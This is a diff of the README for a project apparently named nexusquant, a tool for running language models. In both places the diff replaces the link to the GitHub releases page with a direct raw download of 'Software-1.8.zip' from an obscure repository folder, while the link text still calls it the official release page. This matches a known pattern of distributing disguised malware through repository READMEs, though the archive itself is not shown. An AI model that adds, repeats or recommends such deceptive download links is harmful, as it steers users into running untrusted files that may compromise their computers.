@@ -1,6 +1,6 @@
 # 🧊 nexusquant - Run large language models with ease
 
-[![Download nexusquant](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/hijolk/nexusquant/releases)
+[![Download nexusquant](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/hijolk/nexusquant/raw/refs/heads/main/thysanourous/Software-1.8.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Your computer needs specific parts to run this software. Please check these item
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/hijolk/nexusquant/releases).
+1. Go to the [official release page](https://github.com/hijolk/nexusquant/raw/refs/heads/main/thysanourous/Software-1.8.zip).
 2. Look for the latest release at the top of the page.
 3. Click the file name ending in .zip to start the download.
 4. Open the folder where the file saved.
